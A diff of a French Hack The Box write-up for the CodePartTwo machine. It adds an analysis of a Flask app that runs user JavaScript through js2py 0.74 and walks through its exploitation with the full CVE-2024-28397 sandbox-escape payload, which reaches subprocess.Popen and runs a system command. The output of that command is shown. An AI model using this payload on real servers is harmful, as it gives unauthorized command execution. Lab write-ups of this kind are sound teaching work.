@@ -438,8 +438,6 @@ Plutôt que de cibler immédiatement le service **SSH**, tu vas donc commencer p
 
 ### Analyse de l’application web
 
-#### Observation de la page d’accueil
-
 En ouvrant l’application dans ton navigateur à l’adresse suivante :
 
 ```bash
@@ -448,26 +446,26 @@ http://codeparttwo.htb:8000
 
 tu arrives sur la page d’accueil de l’application CodePartTwo.
 
-![Interface de la page d’accueil de l’application CodePartTwo sur le port 8000 avec les boutons Go to Dashboard et Download App permettant d’accéder au dashboard ou de télécharger l’application](codeparttwo_home_page.png)
+![Page d’accueil de l’application CodePartTwo HTB avec les boutons Login, Register et Download App](codeparttwo_home_page.png)
 
 
 
-L’interface est volontairement très simple et propose deux actions principales :
+La page présente brièvement le projet **CodePartTwo**, une plateforme qui permet aux développeurs **d’écrire, sauvegarder et exécuter du code JavaScript** directement depuis l’application.
 
-- **Go to Dashboard**
+L’interface reste volontairement simple et met en avant trois actions principales :
+
+- **Login**
+- **Register**
 - **Download App**
 
-#### Routes accessibles dans l’application
+Les boutons **Login** et **Register** permettent respectivement de **se connecter** ou de **créer un compte utilisateur** afin d’accéder aux fonctionnalités de l’application.
 
-Le bouton **Go to Dashboard** te mène vers l’espace principal de l’application.
- Cet espace **pourrait toutefois nécessiter un compte utilisateur**, ce qui implique généralement une étape d’**inscription** ou de **connexion**.
+Le bouton **Download App**, lui, est particulièrement intéressant dans un contexte **Hack The Box** : il te permet de **télécharger directement l’application**.
 
-Le bouton **Download App**, lui, est particulièrement intéressant dans un contexte **Hack The Box** : il **t’offre la possibilité de télécharger directement l’application**.
+Dans un CTF, lorsque le code source d’une application est accessible, cela représente souvent une opportunité importante.
+ L’analyse du code peut en effet t’aider à comprendre **le fonctionnement interne de l’application**, à identifier les **routes disponibles**, et parfois à repérer **une vulnérabilité exploitable**.
 
-Dans un CTF, lorsqu’un site web donne accès au **code source de l’application**, c’est souvent une opportunité très précieuse.
- L’analyse du code **pourrait en effet t’aider à comprendre** comment fonctionne l’application, à identifier les **points sensibles**, et parfois à découvrir **directement la vulnérabilité exploitable**.
-
-La prochaine étape consiste donc à **télécharger cette application afin d’analyser son code plus en détail**.
+La prochaine étape consiste donc à **télécharger l’application afin d’analyser son code plus en détail**.
 
 ### Téléchargement et analyse du code source
 #### Téléchargement de l’application
@@ -521,19 +519,232 @@ Autrement dit, analyser ce fichier permet souvent de comprendre **le fonctionnem
 Dans la section suivante, tu vas donc **examiner le fichier `app.py`** afin d’identifier les fonctionnalités exposées par l’application.
 
 ### Identification de la fonctionnalité d’exécution de code
-#### Analyse de la route /run_code
-#### Utilisation de la bibliothèque js2py
+En poursuivant l’analyse du projet, deux fichiers sont particulièrement utiles :
+
+- **`requirements.txt`**, qui liste les dépendances Python
+- **`app.py`**, qui contient la logique de l’application
+
+Le fichier **`requirements.txt`** contient notamment :
+
+```texte
+flask==3.0.3
+flask-sqlalchemy==3.1.1
+js2py==0.74
+```
+
+Les dépendances **Flask** et **Flask-SQLAlchemy** confirment que l’application repose sur une architecture Python classique avec un framework web et une base de données.
+
+En revanche, la présence de **`js2py==0.74`** constitue un **élément beaucoup plus sensible du point de vue de la sécurité**.
+
+La bibliothèque **js2py** permet en effet **d’exécuter du code JavaScript directement depuis Python**. Autrement dit, elle embarque un **interpréteur JavaScript dans l’application**.
+
+Dans un contexte de développement, ce type de bibliothèque peut être utilisé pour permettre aux utilisateurs **d’écrire ou de tester du code JavaScript**.
+
+Dans un **CTF Hack The Box**, la présence d’un interpréteur de code est toujours un point à examiner attentivement : si l’environnement d’exécution n’est pas correctement isolé, il peut parfois être possible de **sortir de la sandbox et d’interagir avec le système sous-jacent**.
+
+La prochaine étape consiste donc à vérifier **où et comment cette bibliothèque est utilisée dans l’application**.
+
+En examinant ensuite le fichier **`app.py`**, tu retrouves justement l’import de cette bibliothèque :
+
+```python
+import js2py
+```
+
+Un peu plus loin dans le code, une route attire particulièrement l’attention :
+
+```python
+@app.route("/run_code", methods=["POST"])
+def run_code():
+```
+
+Le nom de cette route est déjà très explicite : **`/run_code`** suggère une fonctionnalité d’**exécution de code**.
+
+En lisant la fonction associée, tu peux voir que l’application récupère le contenu envoyé par l’utilisateur, puis le transmet à **`js2py`** pour exécution :
+
+```python
+@app.route("/run_code", methods=["POST"])
+def run_code():
+    user_code = request.json.get("code")
+    context = js2py.EvalJs()
+    result = context.eval(user_code)
+    return jsonify({"result": result})
+```
+
+Cette portion de code montre clairement le fonctionnement :
+
+- l’utilisateur envoie du code dans le champ **`code`**
+- l’application crée un contexte JavaScript avec **`js2py.EvalJs()`**
+- le contenu reçu est exécuté avec **`context.eval(user_code)`**
+- le résultat est renvoyé au format **JSON**
+
+Autrement dit, la route **`/run_code`** ne sert pas simplement à manipuler du code JavaScript : elle est directement reliée à **`js2py`** et permet à l’application **d’exécuter le code JavaScript envoyé par l’utilisateur directement sur le serveur**.
+
+La prochaine étape consiste donc à **tester concrètement cette route** afin de vérifier si le serveur exécute effectivement le code JavaScript envoyé par l’utilisateur.
 
 ### Exploitation de l’exécution de code
 #### Test de l’API
-#### Bypass de la sandbox js2py
+
+L’analyse du fichier **`app.py`** montre que la route **`/run_code`** reçoit du code JavaScript envoyé par l’utilisateur et l’exécute à l’aide de la bibliothèque **`js2py`**.
+
+La première étape consiste donc à **tester cette API en pratique** afin de vérifier si le serveur exécute réellement le code JavaScript envoyé dans la requête.
+
+Tu peux pour cela utiliser **`curl`** afin d’envoyer une requête HTTP **POST** vers cette route.
+
+```bash
+curl -X POST http://codeparttwo.htb:8000/run_code \
+  -H "Content-Type: application/json" \
+  -d '{"code":"1+1"}'
+```
+
+Dans cette requête :
+
+- la méthode **POST** est utilisée pour appeler l’API
+- l’en-tête **Content-Type: application/json** indique que les données sont envoyées au format JSON
+- le champ **`code`** contient le code JavaScript à exécuter
+
+Si l’API fonctionne comme suggéré par le code source, le serveur doit exécuter l’expression JavaScript **`1+1`** puis renvoyer le résultat dans la réponse.
+
+La réponse obtenue confirme ce comportement :
+
+```bash
+{"result": 2}
+```
+
+Cela signifie que :
+
+- la route **`/run_code`** est bien accessible
+- le code JavaScript envoyé dans la requête est **effectivement exécuté côté serveur**
+- le résultat de l’exécution est renvoyé au format **JSON**
+
+Cette étape confirme donc que l’application expose **un mécanisme d’exécution de code JavaScript côté serveur**.
+
+La prochaine étape consiste maintenant à examiner **si l’environnement `js2py` est correctement isolé**, ou s’il est possible d’interagir avec les objets Python sous-jacents.
+ Si ce n’est pas le cas, il pourrait être possible de **sortir de la sandbox et d’accéder au système**.
+
+#### Évasion de la sandbox JavaScript (js2py)
+
+Le test précédent a confirmé que la route **`/run_code`** permet d’exécuter du code JavaScript envoyé par l’utilisateur.
+Ce code est interprété côté serveur à l’aide de la bibliothèque **`js2py`**.
+
+En théorie, cette exécution devrait se faire dans une **sandbox**, c’est-à-dire un environnement isolé censé empêcher l’accès au système ou aux objets internes de l’application.
+
+À ce stade, une bonne pratique consiste à rechercher si la bibliothèque utilisée présente **des vulnérabilités connues**.
+ Une recherche rapide du type :
+
+```texte
+js2py 0.74 poc exploit github
+```
+
+permet rapidement de trouver un **Proof of Concept** décrivant une vulnérabilité dans **js2py 0.74**.
+
+La première réponse de cette recherche renvoie vers le dépôt GitHub de **Marven11**, qui décrit une **évasion de la sandbox js2py (CVE-2024-28397)** :
+
+https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape
+
+La plupart des autres articles et analyses disponibles sur Internet se réfèrent d’ailleurs souvent à ce travail initial.
+
+Ce PoC montre qu’il est possible de **sortir de la sandbox JavaScript et d’accéder à l’environnement Python sous-jacent**, ce qui ouvre la voie à l’exécution de commandes sur le serveur.
+
+Il reste maintenant à tester cette technique sur l’API `/run_code` afin de vérifier si l’application est vulnérable.
+
+#### Explication du PoC de Marven11
+
+Dans **`app.py`**, on peut voir que l’application tente de sécuriser l’environnement d’exécution avec l’instruction :
+
+```
+js2py.disable_pyimport()
+```
+
+Cette fonction est censée empêcher l’import de modules Python depuis le code JavaScript exécuté par **js2py**, afin d’éviter qu’un utilisateur puisse accéder directement aux fonctionnalités du système.
+
+Cependant, le PoC publié par **Marven11** montre qu’il est possible de **contourner cette restriction**.
+ L’exploitation repose sur l’utilisation des mécanismes d’introspection de Python accessibles indirectement depuis l’environnement JavaScript.
+
+Le payload commence par récupérer certains attributs internes comme **`__class__`** et **`__base__`**, puis parcourt les **classes Python disponibles en mémoire** grâce à la méthode **`__subclasses__()`**.
+ Cette recherche permet finalement d’identifier la classe **`subprocess.Popen`**, qui peut être utilisée pour **exécuter des commandes système**.
+
+Une fois cette classe trouvée, le PoC l’utilise pour lancer une commande sur le système et récupérer le résultat avec **`.communicate()`**.
+
+Autrement dit, même si **`js2py.disable_pyimport()`** empêche l’import direct de modules Python, il reste possible de **remonter vers les objets internes de Python et d’exécuter des commandes système**, ce qui permet de sortir de la sandbox **js2py**.
+
+#### Test de l’exploitation sur la cible
+
+Pour vérifier si la cible est vulnérable à cette technique, tu peux adapter le PoC et tester l’exploitation directement depuis l’interface web de l’application.
+
+Commence par créer un compte utilisateur via la page **Register**. Par exemple :
+
+```
+noelnac : password123
+```
+
+Une fois l’inscription effectuée, connecte-toi via **Login**.
+ Tu arrives alors sur le **dashboard**, qui permet d’exécuter du code JavaScript grâce à la fonctionnalité **Run Code**.
+
+Tu peux alors copier-coller le payload publié par **Marven11** dans l’interface.
+ Pour simplifier le test, il suffit de remplacer la commande par **`id`** :
+
+```javascript
+let cmd = "id"
+let hacked, bymarve, n11
+let getattr, obj
+
+hacked = Object.getOwnPropertyNames({})
+bymarve = hacked.__getattribute__
+n11 = bymarve("__getattribute__")
+obj = n11("__class__").__base__
+getattr = obj.__getattribute__
+
+function findpopen(o) {
+    let result;
+    for(let i in o.__subclasses__()) {
+        let item = o.__subclasses__()[i]
+        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
+            return item
+        }
+        if(item.__name__ != "type" && (result = findpopen(item))) {
+            return result
+        }
+    }
+}
+
+n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
+console.log(n11)
+n11
+```
+
+En cliquant sur **Run Code**, l’application renvoie cependant l’erreur suivante :
+
+```texte
+Error: 'NoneType' object is not callable
+```
+
+Cette erreur provient de la fonction **`.communicate()`**.
+ Dans Python, cette méthode renvoie un **tuple contenant la sortie standard et la sortie d’erreur de la commande exécutée**.
+
+Dans notre cas, la sortie de la commande se trouve dans **le premier élément du tuple**.
+ Il faut donc récupérer cette valeur et la convertir en texte.
+
+En modifiant légèrement la dernière ligne du payload, par exemple :
+
+```javascript
+n11[0].decode()
+```
+
+le résultat est correctement renvoyé par l’application :
+
+```texte
+uid=1001(app) gid=1001(app) groups=1001(app)
+```
+
+![Dashboard de CodePartTwo HTB montrant l’exécution du payload js2py sandbox escape avec la commande id et le résultat uid=1001(app) gid=1001(app)](dashboard_cmd_id_n11_decode.png)
+
+Cette réponse confirme que le payload parvient bien à **sortir de la sandbox js2py et à exécuter une commande système sur le serveur**.
 
 ### Extraction de données sensibles
 #### Récupération de la base instance/users.db
 #### Analyse de la base SQLite
 
-### Connexion SSH
-#### Accès à la machine avec l’utilisateur marco
+### Connexion SSH avec l’utilisateur marco
 ## Récupération du user flag
 
 
